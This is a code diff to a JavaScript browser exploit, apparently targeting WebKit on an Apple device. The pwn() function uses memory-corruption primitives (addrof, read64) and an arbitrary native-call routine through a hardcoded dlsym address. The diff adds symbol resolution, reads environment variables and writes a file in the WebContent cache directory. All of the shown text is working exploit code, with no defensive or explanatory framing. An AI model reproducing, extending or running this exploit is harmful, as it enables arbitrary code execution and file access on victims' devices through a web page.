@@ -297,6 +297,19 @@ function pwn() {
         return read64(addrof(byteArray) + 0x10);
     }
     
+    // Replace with the dlsym address for your device
+    let dlsymAddr = 0x18039e2b8;
+    let symbols = {};
+    
+    // function to resolve a symbol
+    function resolveSymbol(func) {
+        if (typeof func == "string") {
+            if (!(func in symbols)) symbols[func] = arbCall(dlsymAddr, -2, func);
+            return symbols[func];
+        }
+        return BigInt(func);
+    }
+    
     // function to make an arbitrary call
     function arbCall(func, ...args) {
         if (args.length > 10) {
@@ -304,7 +317,12 @@ function pwn() {
             return -1;
         }
         arbCallContext.fill(0n);
-        arbCallContext[0] = BigInt(func);
+        let funcAddress = resolveSymbol(func);
+        if (funcAddress == 0) {
+            log(`[+] funcAddress cannot be NULL!`);
+            return -1;
+        }
+        arbCallContext[0] = funcAddress;
         for (let x = 0; x < args.length; x++) {
             let arg = args[x];
             let value;
@@ -323,27 +341,19 @@ function pwn() {
         return arbCallContext[1];
     }
     
-    
     // crash to verify thread state in crash log
     // arbCall(0xdeadbeefdeadbeef, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A);
     
-    let dlsymAddr = 0x18039e2b8;
-    let getenvAddr = arbCall(dlsymAddr, -2, "getenv");
-    let memcpyAddr = arbCall(dlsymAddr, -2, "memcpy");
-    let strlenAddr = arbCall(dlsymAddr, -2, "strlen");
-    let openAddr = arbCall(dlsymAddr, -2, "open");
-    let writeAddr = arbCall(dlsymAddr, -2, "write");
-    
-    log(`[+] dlsym address: 0x${dlsymAddr.toString(16)}`);
-    log(`[+] getenv address: 0x${getenvAddr.toString(16)}`);
-    log(`[+] memcpy address: 0x${memcpyAddr.toString(16)}`);
-    log(`[+] strlen address: 0x${strlenAddr.toString(16)}`);
-    log(`[+] open address: 0x${openAddr.toString(16)}`);
-    log(`[+] write address: 0x${writeAddr.toString(16)}`);
-    
+    log(`[+] dlsym address: 0x${resolveSymbol("dlsym").toString(16)}`);
+    log(`[+] getenv address: 0x${resolveSymbol("getenv").toString(16)}`);
+    log(`[+] memcpy address: 0x${resolveSymbol("memcpy").toString(16)}`);
+    log(`[+] strlen address: 0x${resolveSymbol("strlen").toString(16)}`);
+    log(`[+] open address: 0x${resolveSymbol("open").toString(16)}`);
+    log(`[+] write address: 0x${resolveSymbol("write").toString(16)}`);
+
     // memcpy wrapper function
     function memcpy(destination, source, size) {
-        return arbCall(memcpyAddr, destination, source, size);
+        return arbCall("memcpy", destination, source, size);
     }
     
     // read arbitrary number of bytes from an address via memcpy
@@ -355,7 +365,7 @@ function pwn() {
     
     // strlen wrapper function
     function strlen(string) {
-        return Number(arbCall(strlenAddr, string));
+        return Number(arbCall("strlen", string));
     }
     
     // function to make a JS string from a c string at a given address
@@ -367,54 +377,37 @@ function pwn() {
     
     // getenv wrapper function
     function getenv(name) {
-        return readString(arbCall(getenvAddr, name));
+        return readString(arbCall("getenv", name));
     }
     
     // open wrapper function
     function open(path, flags) {
-        return arbCall(openAddr, path, flags);
+        return arbCall("open", path, flags);
     }
     
     // write wrapper function
     function write(fd, buf, size) {
-        return arbCall(writeAddr, fd, buf, size);
+        return arbCall("write", fd, buf, size);
+    }
+   
+    log(`[+] HOME: ${getenv("HOME")}`);
+    log(`[+] PATH: ${getenv("PATH")}`);
+    log(`[+] USER: ${getenv("USER")}`);
+    
+    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/file.txt";
+    log(`[+] filePath: ${filePath}`);
+    
+    const O_RDWR = 0x0002;
+    const O_CREAT = 0x00000200;
+    const O_TRUNC = 0x00000400;
+    
+    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
+    // check if it failed
+    if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
+        log("[+] Failed to open file!");
+        return;
     }
     
-    let objc_getClassAddr = arbCall(dlsymAddr, -2, "objc_getClass");
-    let objc_msgSendAddr = arbCall(dlsymAddr, -2, "objc_msgSend");
-    let sel_registerNameAddr = arbCall(dlsymAddr, -2, "sel_registerName");
-    
-    log(`[+] objc_getClass address: 0x${objc_getClassAddr.toString(16)}`);
-    log(`[+] objc_msgSend address: 0x${objc_msgSendAddr.toString(16)}`);
-    log(`[+] sel_registerName address: 0x${sel_registerNameAddr.toString(16)}`);
-    
-    let NSStringClass = arbCall(objc_getClassAddr, "NSString");
-    log(`[+] NSStringClass: 0x${NSStringClass.toString(16)}`);
-    
-    let stringWithCStringSel = arbCall(sel_registerNameAddr, "stringWithCString:");
-    log(`[+] stringWithCStringSel: 0x${stringWithCStringSel.toString(16)}`);
-    
-//    let ret = arbCall(objc_msgSendAddr, NSStringClass, stringWithCStringSel, "Hello, World!");
-//    log(`[+] ret: 0x${ret.toString(16)}`);
-//    
-//    log(`[+] HOME: ${getenv("HOME")}`);
-//    log(`[+] PATH: ${getenv("PATH")}`);
-//    log(`[+] USER: ${getenv("USER")}`);
-//    
-//    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/file.txt";
-//    log(`[+] filePath: ${filePath}`);
-//    
-//    const O_RDWR = 0x0002;
-//    const O_CREAT = 0x00000200;
-//    const O_TRUNC = 0x00000400;
-//    
-//    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
-//    // check if it failed
-//    if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
-//        log("[+] Failed to open file!");
-//        return;
-//    }
-//    
-//    log(`[+] fd: ${fd}`);
-//    write(fd, "Hello, World!", 13);
+    log(`[+] fd: ${fd}`);
+    write(fd, "Hello, World!", 13);
 }
